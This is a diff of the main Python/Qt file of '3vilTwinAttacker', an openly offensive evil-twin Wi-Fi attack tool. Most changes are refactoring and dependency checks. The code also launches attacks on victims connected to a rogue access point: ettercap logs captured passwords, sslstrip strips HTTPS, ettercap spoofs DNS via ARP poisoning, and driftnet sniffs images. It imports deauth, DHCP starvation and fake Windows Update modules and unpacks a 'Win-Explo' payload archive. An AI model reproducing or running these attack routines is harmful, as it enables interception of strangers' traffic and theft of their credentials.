@@ -4,36 +4,46 @@ from shutil import move
 from time import sleep
 from platform import dist
 from re import search
-from os import geteuid,mkdir,system,path,getcwd,chdir,remove
+from os import geteuid,mkdir,system,path,getcwd,chdir,remove,popen
 from sys import argv
 if search("/usr/share/",argv[0]):
     chdir("/usr/share/3vilTwinAttacker/")
-from Module.DHCPstarvation import frm_dhcp_Attack,frm_dhcp_main
-from Module.deauth_func import frm_window
-from Module.mac_change_func import frm_mac_generator
-from Module.Probe_func import frm_PMonitor
-from Module.Dns_Func import frm_dnsspoof
-from Module.networksdisc import frm_GetIP
-from Module.AttackUp import frm_update_attack
+from Modules.DHCPstarvation import frm_dhcp_Attack,frm_dhcp_main
+from Modules.deauth_func import frm_window
+from Modules.mac_change_func import frm_mac_generator
+from Modules.Probe_func import frm_PMonitor
+from Modules.Dns_Func import frm_dnsspoof
+from Modules.networksdisc import frm_GetIP
+from Modules.AttackUp import frm_update_attack
 from Core.check import check_dependencies
 from Core.check_privilege import frm_privelege
-from Core.Settings_fuc import frm_Settings
-from Module.AttackUp import frm_WinSoftUp
+from Core.Settings import frm_Settings
+from Modules.AttackUp import frm_WinSoftUp
 from Core.update import frm_Update
-from Module.arps_Posion import frm_Arp_Poison
+from Modules.arps_Posion import frm_Arp_Poison
 __author__ = ' @mh4x0f P0cl4bs Team'
-__version__= "0.5.8"
+__version__= "0.5.9"
 __date_create__= "18/01/2015"
 __update__="29/03/2015"
+
 class frmControl(QMainWindow):
     def __init__(self, parent=None):
         super(frmControl, self).__init__(parent)
         self.form_widget = frm_main(self)
         self.setCentralWidget(self.form_widget)
         self.setWindowTitle("3vilTwin-Attacker v" + __version__)
-        sshFile="Core/dark_style.css"
-        with open(sshFile,"r") as fh:
-            self.setStyleSheet(fh.read())
+        self.config = frm_Settings()
+        self.loadtheme(self.config.XmlThemeSelected())
+
+    def loadtheme(self,theme):
+        if theme != "theme2":
+            sshFile=("Core/%s.css"%(theme))
+            with open(sshFile,"r") as fh:
+                self.setStyleSheet(fh.read())
+        else:
+            sshFile=("Core/%s.css"%(theme))
+            with open(sshFile,"r") as fh:
+                self.setStyleSheet(fh.read())
 
     def center(self):
         frameGm = self.frameGeometry()
@@ -88,7 +98,7 @@ class frm_main(QWidget):
         Menu_tools.addAction(ssl)
         Menu_tools.addAction(btn_drift)
 
-        Menu_module = self.myQMenuBar.addMenu("&Module")
+        Menu_module = self.myQMenuBar.addMenu("&Modules")
         btn_deauth = QAction("Deauth Attack", self)
         btn_deauth.setShortcut("Ctrl+W")
         btn_probe = QAction("Probe Request",self)
@@ -107,7 +117,7 @@ class frm_main(QWidget):
         btn_arp.setShortcut("ctrl+Q")
 
 
-        #icons Module
+        #icons Modules
         action_settings.setIcon(QIcon("rsc/setting.png"))
         btn_arp.setIcon(QIcon("rsc/arp_.png"))
         btn_winup.setIcon(QIcon("rsc/arp.png"))
@@ -154,12 +164,10 @@ class frm_main(QWidget):
         Menu_update.setIcon(QIcon("rsc/update.png"))
 
         Menu_about.triggered.connect(self.about)
-        #Menu_help.triggered.connect(self.help)
-        #Menu_update.triggered.connect(self.show_update)
+        Menu_update.triggered.connect(self.show_update)
 
-        #Menu_extra.addAction(Menu_update)
+        Menu_extra.addAction(Menu_update)
         Menu_extra.addAction(Menu_about)
-        #Menu_extra.addAction(Menu_help)
 
         self.input_gw = QLineEdit(self)
         self.input_AP = QLineEdit(self)
@@ -181,12 +189,20 @@ class frm_main(QWidget):
         for i,j in enumerate(n):
             if search("wlan", j):
                 self.w.addItem(n[i])
-        if not path.isfile("Module/Win-Explo/Windows_Update/Settins_WinUpdate.html"):
-            system("cp Settings/source.tar.gz Module/Win-Explo/")
-            system('cd Module/Win-Explo/ && tar -xf source.tar.gz')
-            remove("Module/Win-Explo/source.tar.gz")
-        else:
-            print("teste")
+        if not path.isfile("Modules/Win-Explo/Windows_Update/Settins_WinUpdate.html"):
+            system("cp Settings/source.tar.gz Modules/Win-Explo/")
+            system('cd Modules/Win-Explo/ && tar -xf source.tar.gz')
+            remove("Modules/Win-Explo/source.tar.gz")
+
+        driftnet = popen("which driftnet").read().split("\n")
+        ettercap = popen("which ettercap").read().split("\n")
+        sslstrip = popen("which sslstrip").read().split("\n")
+        xterm = popen("which xterm").read().split("\n")
+        dhcpd = popen("which dhcpd").read().split("\n")
+        lista = [ "/usr/sbin/airbase-ng", ettercap[0], sslstrip[0],xterm[0],driftnet[0]]
+        self.m = []
+        for i in lista:
+            self.m.append(path.isfile(i))
         self.form = QFormLayout()
         hLine = QFrame()
         hLine.setFrameStyle(QFrame.HLine)
@@ -223,7 +239,7 @@ class frm_main(QWidget):
         self.btn_start_attack.setFixedWidth(160)
         self.btn_cancelar = QPushButton("Stop Attack", self)
         self.btn_cancelar.setIcon(QIcon("rsc/Stop.png"))
-        self.btn_cancelar.setFixedWidth(160)
+        self.btn_cancelar.setFixedWidth(165)
         self.btn_cancelar.clicked.connect(self.kill)
         self.btn_start_attack.clicked.connect(self.start_air)
 
@@ -307,13 +323,17 @@ class frm_main(QWidget):
         system("clear")
 
     def start_etter(self):
-        system("sudo xterm -geometry 73x25-1+50 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w passwords -i at0 & ettercapid=$!")
+        if self.m[1] != False:
+            system("sudo xterm -geometry 73x25-1+50 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w passwords -i at0 & ettercapid=$!")
     def start_ssl(self):
-        system("sudo xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -k -l 10000 & sslstripid=$!")
+        if self.m[2] != False:
+            system("sudo xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -k -l 10000 & sslstripid=$!")
     def start_dns(self):
-        system("sudo xterm -geometry 73x25-1+250 -T DNSSpoof -e ettercap -P dns_spoof -T -q -M arp // // -i at0 & dnscapid=$!")
+        if self.m[1] != False:
+            system("sudo xterm -geometry 73x25-1+250 -T DNSSpoof -e ettercap -P dns_spoof -T -q -M arp // // -i at0 & dnscapid=$!")
     def start_dift(self):
-        system("sudo xterm -geometry 75x15+1+200 -T DriftNet -e driftnet -i at0 & driftnetid=$!")
+        if self.m[4] != False:
+            system("sudo xterm -geometry 75x15+1+200 -T DriftNet -e driftnet -i at0 & driftnetid=$!")
 
     def configure(self):
 
